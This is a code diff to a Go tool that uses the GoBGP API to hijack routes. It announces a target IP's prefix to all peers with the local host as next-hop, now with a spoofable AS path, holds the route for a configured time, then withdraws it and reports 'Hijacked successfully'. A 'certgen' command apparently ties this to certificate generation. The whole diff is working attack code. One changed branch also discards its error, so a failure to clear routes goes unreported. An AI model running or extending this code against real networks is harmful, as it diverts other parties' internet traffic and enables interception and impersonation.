@@ -235,7 +235,7 @@ func createCommunityAttributes() ([]*anypb.Any, error) {
 	return attrs, nil
 }
 
-func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, prefixLen uint32, nextHop string) error {
+func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, prefixLen uint32, nextHop string, asn ...uint32) error {
 	// Create NLRI
 	nlri, err := anypb.New(&api.IPAddressPrefix{
 		Prefix:    prefix,
@@ -261,14 +261,31 @@ func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, pre
 		return fmt.Errorf("failed to create origin attribute: %v", err)
 	}
 
+	// Create AS path attribute if ASN is provided
+	var pattrs []*anypb.Any
+	pattrs = append(pattrs, origin, nextHopAttr)
+
+	if len(asn) > 0 {
+		asPath := &api.AsPathAttribute{
+			Segments: []*api.AsSegment{
+				{
+					Type:    2, // AS_SEQUENCE
+					Numbers: []uint32{asn[0]},
+				},
+			},
+		}
+		asPathAttr, err := anypb.New(asPath)
+		if err != nil {
+			return fmt.Errorf("failed to create AS path attribute: %v", err)
+		}
+		pattrs = append(pattrs, asPathAttr)
+	}
+
 	// Create community attributes (both standard and large)
 	communityAttrs, err := createCommunityAttributes()
 	if err != nil {
 		return fmt.Errorf("failed to create community attributes: %v", err)
 	}
-
-	// Combine all path attributes
-	pattrs := []*anypb.Any{origin, nextHopAttr}
 	pattrs = append(pattrs, communityAttrs...)
 
 	path := &api.Path{
@@ -410,7 +427,7 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 		}
 
 		// Add a new route using our local address as next-hop
-		err = addRoute(client, ctx, ip, prefixLen, peer.Peer.Transport.LocalAddress)
+		err = addRoute(client, ctx, ip, prefixLen, peer.Peer.Transport.LocalAddress, asn)
 		if err != nil {
 			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
 		}
@@ -418,19 +435,6 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 		fmt.Printf("Route added successfully to %s (%s)\n", 
 			peer.Peer.Conf.NeighborAddress, np)
 	}
-
-	// Wait for the configured time if not in dryrun mode
-	if !dryrun && config.Time > 0 {
-		fmt.Printf("[INFO] Waiting for %d seconds...\n", config.Time)
-		time.Sleep(time.Duration(config.Time) * time.Second)
-		fmt.Println("[INFO] Wait completed")
-	}
-
-	// Clear routes
-	if err := clearRoutes(client, ctx); err != nil {
-		return fmt.Errorf("failed to clear routes: %v", err)
-	}
-	fmt.Println("Hijacked successfully")
 
 	return nil
 }
@@ -515,7 +519,20 @@ func main() {
 		if err := hijackRoutes(client, ctx, targetIP, dryrun); err != nil {
 			log.Fatalf("Failed to hijack routes: %v", err)
 		}
-		//TODO: wait for config.Time seconds
+
+		// Wait for the configured time if not in dryrun mode
+		if !dryrun && config.Time > 0 {
+			fmt.Printf("[INFO] Waiting for %d seconds...\n", config.Time)
+			time.Sleep(time.Duration(config.Time) * time.Second)
+			fmt.Println("[INFO] Wait completed")
+		}
+
+		// Clear routes
+		if err := clearRoutes(client, ctx); err != nil {
+			fmt.Errorf("failed to clear routes: %v", err)
+		}
+		fmt.Println("Hijacked successfully")
+		
 
 	case "certgen":
 		if len(os.Args) < 3 {
